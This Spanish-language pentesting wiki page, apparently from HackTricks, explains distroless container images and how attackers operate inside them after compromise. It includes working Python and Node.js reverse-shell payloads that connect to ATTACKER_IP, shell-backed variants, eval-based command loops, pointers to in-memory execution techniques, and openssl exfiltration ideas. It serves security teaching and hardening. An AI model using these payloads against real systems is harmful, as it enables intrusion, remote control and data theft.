# Contenedores Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Descripción general

Una imagen de contenedor **distroless** incluye los **componentes mínimos de runtime necesarios para ejecutar una aplicación específica**, y elimina intencionadamente las herramientas habituales de una distribución, como los gestores de paquetes, los shells y grandes conjuntos de utilidades genéricas de userland. En la práctica, las imágenes distroless suelen contener únicamente el binario o runtime de la aplicación, sus bibliotecas compartidas, paquetes de certificados y una estructura de filesystem muy pequeña. <sup>[[1]](#references)</sup>

La idea no es que distroless sea una nueva primitiva de aislamiento del kernel. Distroless es una **estrategia de diseño de imágenes**. Cambia lo que está disponible **dentro** del filesystem del contenedor, no la forma en que el kernel lo aísla. Esta distinción importa, porque distroless refuerza el entorno principalmente al reducir lo que un atacante puede usar después de obtener ejecución de código. No sustituye a namespaces, seccomp, capabilities, AppArmor, SELinux ni a ningún otro mecanismo de aislamiento en runtime.

## Por qué existe Distroless

Las imágenes distroless se usan principalmente para reducir:

- el tamaño de la imagen
- la complejidad operativa de la imagen
- la cantidad de paquetes y binarios que podrían contener vulnerabilidades
- la cantidad de herramientas de post-exploitation disponibles por defecto para un atacante

Por eso las imágenes distroless son populares en los despliegues de aplicaciones en producción. Un contenedor que no contiene shell, ni gestor de paquetes y casi ninguna herramienta genérica suele ser más fácil de gestionar operativamente y más difícil de abusar de forma interactiva tras una intrusión.

Algunos ejemplos de familias de imágenes de estilo distroless conocidas son:

- Las imágenes distroless de Google <sup>[[1]](#references)</sup>
- Las imágenes reforzadas/minimalistas de Chainguard <sup>[[2]](#references)</sup>

## Qué no significa Distroless

Un contenedor distroless **no** es:

- automáticamente rootless
- automáticamente sin privilegios
- automáticamente de solo lectura
- automáticamente protegido por seccomp, AppArmor o SELinux
- automáticamente a salvo de un escape de contenedor

Sigue siendo posible ejecutar una imagen distroless con `--privileged`, compartir namespaces del host, usar bind mounts peligrosos o montar un socket de runtime. En ese caso, la imagen puede ser minimalista, pero el contenedor puede seguir siendo catastróficamente inseguro. Distroless cambia la **superficie de ataque de userland**, no el **límite de confianza del kernel**.

## Características operativas habituales

Cuando comprometes un contenedor distroless, lo primero que sueles notar es que las suposiciones habituales dejan de ser válidas. Puede que no haya `sh`, `bash`, `ls`, `id`, `cat`, e incluso que no haya un entorno basado en libc que se comporte como espera tu tradecraft habitual. Esto afecta tanto a offense como a defense, porque la falta de herramientas cambia la depuración, la respuesta ante incidentes y la post-exploitation.

Los patrones más habituales son:

- existe el runtime de la aplicación, pero hay poco más
- los payloads basados en shell fallan porque no hay shell
- los one-liners habituales de enumeración fallan porque faltan los binarios auxiliares
- también suelen estar presentes protecciones del filesystem, como rootfs de solo lectura o `noexec` en ubicaciones tmpfs con permisos de escritura

Esta combinación es lo que suele llevar a la gente a hablar de «weaponizing distroless».

## Distroless y Post-Exploitation

El principal desafío ofensivo en un entorno distroless no siempre es el RCE inicial. A menudo es lo que viene después. Si la workload vulnerada permite ejecutar código en un runtime de lenguaje como Python, Node.js, Java o Go, puede que puedas ejecutar lógica arbitraria, pero no mediante los workflows habituales centrados en shell que son comunes en otros objetivos Linux.

Esto significa que la post-exploitation suele tomar una de estas tres direcciones:

1. **Usar directamente el runtime de lenguaje existente** para enumerar el entorno, abrir sockets, leer archivos o preparar payloads adicionales.
2. **Cargar tus propias herramientas en memoria** si el filesystem es de solo lectura o las ubicaciones con permisos de escritura están montadas con `noexec`.
3. **Abusar de los binarios existentes en la imagen** si la aplicación o sus dependencias incluyen algo inesperadamente útil.

## Abuso

### Enumerar el runtime que ya tienes

En muchos contenedores distroless no hay shell, pero sí hay un runtime de aplicación. Si el objetivo es un servicio Python, Python está disponible. Si el objetivo es Node.js, Node está disponible. Esto suele ofrecer funcionalidad suficiente para enumerar archivos, leer variables de entorno, abrir reverse shells y preparar ejecución en memoria sin invocar nunca `/bin/sh`.

Un ejemplo sencillo con Python:

```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```

Un ejemplo sencillo con Node.js:

```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```

Impact:

- recuperación de variables de entorno, que a menudo incluyen credenciales o endpoints de servicios
- enumeración del sistema de archivos sin `/bin/ls`
- identificación de rutas con permisos de escritura y secretos montados

### Sesión interactiva sin `/bin/sh`

Si la imagen no contiene `sh` ni `bash`, falla una reverse shell clásica basada en shell. En ese caso, expón una sesión interactiva en el runtime del lenguaje instalado en lugar de iniciar un shell inexistente.

Por ejemplo, este payload de Python redirige una consola interactiva de Python a través de un socket:

```bash
python3 - <<'PY'
import code, socket, sys
s = socket.create_connection(("ATTACKER_IP", 4444))
stream = s.makefile("rw", buffering=1)
sys.stdin = sys.stdout = sys.stderr = stream
code.interact(local=globals())
PY
```

El enfoque equivalente en Node.js puede evaluar JavaScript recibido a través de un socket. Es un REPL de JavaScript, no un shell del sistema operativo; las operaciones de sistema de archivos, procesos y redes deben realizarse mediante las API de Node.

```bash
node -e 'const net=require("net");const s=net.connect(4444,"ATTACKER_IP");s.on("data",d=>{try{s.write(String(eval(d.toString()))+"\n")}catch(e){s.write(String(e)+"\n")}});'
```

Ambos ejemplos requieren conectividad saliente y un intérprete disponible, y solo ofrecen las funciones que expone ese intérprete.

Si la imagen incluye inesperadamente `/bin/sh`, los payloads clásicos de shell asistidos por intérprete siguen siendo útiles. Se muestran por separado porque no son realmente libres de shell:

```bash
# Python plus an existing /bin/sh
python3 - <<'PY'
import os, pty, socket
s = socket.create_connection(("ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/sh")
PY

# Node.js plus an existing /bin/sh
node -e 'const net=require("net"),cp=require("child_process");const s=net.connect(4444,"ATTACKER_IP",()=>{const p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```

El patrón antiguo de bucle de comandos de Python también es útil cuando existe `/bin/sh`, pero una PTY interactiva resulta poco práctica. Se conserva aquí con su dependencia real explícita: `subprocess.run(..., shell=True)` invoca el shell del sistema y, por lo tanto, **no** es una técnica sin shell.

```bash
python3 -c '
import subprocess
while True:
    cmd = input("sh> ")
    if cmd.strip() in ("exit", "quit"):
        break
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout, end="")
    print(result.stderr, end="")
'
```

### Ejemplo completo: Bucle de comandos en Python sin shell

Si la imagen tiene Python pero no tiene ningún shell, un REPL local de Python aún puede permitir inspeccionar el sistema de archivos, el entorno y la red:

```bash
python3 - <<'PY'
namespace = {}
while True:
    source = input("py> ")
    if source.strip() in ("exit", "quit"):
        break
    try:
        result = eval(source, namespace)
        if result is not None:
            print(repr(result))
    except SyntaxError:
        exec(source, namespace)
PY
```

Este bucle no invoca `/bin/sh`. Evalúa expresiones e instrucciones de Python directamente, por lo que las operaciones deben usar APIs de Python en lugar de comandos de shell. Dentro de esa limitación, aún puede proporcionar gran parte del impacto de un shell básico: enumerar el sistema de archivos y el entorno, acceder a datos, realizar actividad de red y preparar payloads adicionales mediante el runtime instalado.

### Ejecución de herramientas en memoria

Las imágenes Distroless suelen combinarse con:

- `readOnlyRootFilesystem: true`
- un tmpfs escribible pero `noexec`, como `/dev/shm`
- la ausencia de herramientas de gestión de paquetes

Esta combinación hace que los flujos de trabajo clásicos de «descargar un binario al disco y ejecutarlo» no sean fiables. En esos casos, las técnicas de ejecución en memoria se convierten en la principal alternativa.

La página dedicada a esto es:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Las técnicas más relevantes allí son:

- `memfd_create` + `execve` mediante runtimes de scripting <sup>[[4]](#references)</sup>
- DDexec / EverythingExec
- memexec
- memdlopen

En un servicio de Python, Node.js o PHP, el punto de entrada puede ser un bug de la aplicación, como una inyección de plantillas, una contaminación de prototipos o una evaluación insegura. Si permite ejecutar código dentro del proceso, una técnica con `/proc/self/mem` puede ejecutar un loader sin necesidad de un shell ni de un archivo ejecutable en el disco. Esto sigue siendo ejecución con la identidad del proceso del contenedor; para escapar del contenedor se necesita una debilidad independiente en el runtime o en el límite del host. Consulta las [técnicas para sistemas de solo lectura/noexec/Distroless](../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/README.md) para conocer los requisitos previos.

### Binarios existentes en la imagen

Algunas imágenes Distroless aún contienen binarios necesarios para las operaciones que resultan útiles tras una vulneración. Un ejemplo observado repetidamente es `openssl`, porque a veces las aplicaciones lo necesitan para tareas relacionadas con la criptografía o TLS.

Un patrón de búsqueda rápido es:

```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```

Si `openssl` está presente, podría servir para:

- conexiones TLS salientes
- exfiltración de datos a través de un canal de salida permitido
- preparación de datos de payload mediante blobs codificados/cifrados

El abuso exacto depende de lo que esté instalado, pero la idea general es que distroless no significa «sin herramientas en absoluto»; significa «muchas menos herramientas que una imagen de distribución normal».

## Comprobaciones

El objetivo de estas comprobaciones es determinar si la imagen es realmente distroless en la práctica y qué binarios de runtime o auxiliares siguen disponibles para post-exploitation.

```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```

Qué resulta interesante aquí:

- Si no hay ningún shell, pero sí está disponible un runtime como Python o Node, el post-exploitation debería pasar a la ejecución impulsada por el runtime.
- Si el sistema de archivos raíz es de solo lectura y `/dev/shm` permite escritura, pero tiene `noexec`, las técnicas de ejecución en memoria cobran mucha más relevancia.
- Si hay binarios auxiliares como `openssl`, `busybox` o `java`, pueden ofrecer funcionalidad suficiente para preparar un acceso adicional.

## Valores predeterminados del runtime

| Estilo de imagen / plataforma | Estado predeterminado | Comportamiento habitual | Debilitamiento manual frecuente |
| --- | --- | --- | --- |
| Imágenes de estilo distroless de Google | userland mínimo por diseño | Sin shell, sin gestor de paquetes, solo dependencias de la aplicación/runtime | añadir capas de depuración, shells sidecar, copiar busybox o herramientas |
| Imágenes mínimas de Chainguard | userland mínimo por diseño | Superficie de paquetes reducida, a menudo centrada en un runtime o servicio | usar variantes `:latest-dev` o de depuración, copiar herramientas durante la compilación |
| Workloads de Kubernetes que usan imágenes distroless | Depende de la configuración del Pod | Distroless solo afecta al userland; la postura de seguridad del Pod sigue dependiendo de la especificación del Pod y de los valores predeterminados del runtime | añadir contenedores de depuración efímeros, montajes del host, configuración de Pod privilegiada |
| Docker / Podman ejecutando imágenes distroless | Depende de las opciones de ejecución | Sistema de archivos mínimo, pero la seguridad del runtime sigue dependiendo de las opciones y la configuración del daemon | `--privileged`, compartir namespaces del host, montajes del socket del runtime, binds del host con permisos de escritura |

La idea clave es que distroless es una **propiedad de la imagen**, no una protección del runtime. Su valor proviene de reducir lo que está disponible dentro del sistema de archivos después de un compromiso. Las compilaciones multietapa son una forma habitual de mantener las herramientas de compilación fuera de la imagen final. <sup>[[3]](#references)</sup>

## Páginas relacionadas

Para los bypasses del sistema de archivos y de la ejecución en memoria que suelen necesitarse en entornos distroless:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Para el abuso del runtime de contenedores, los sockets y los montajes que también se aplica a los workloads distroless:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## References

- [1] [GoogleContainerTools - Imágenes de contenedor distroless](https://github.com/GoogleContainerTools/distroless)
- [2] [Documentación de Chainguard Images](https://edu.chainguard.dev/chainguard/chainguard-images/)
- [3] [Docker Docs - Compilaciones multietapa](https://docs.docker.com/build/building/multi-stage/)
- [4] [`memfd_create(2)` - Página del manual de Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
{{#include ../../../banners/hacktricks-training.md}}
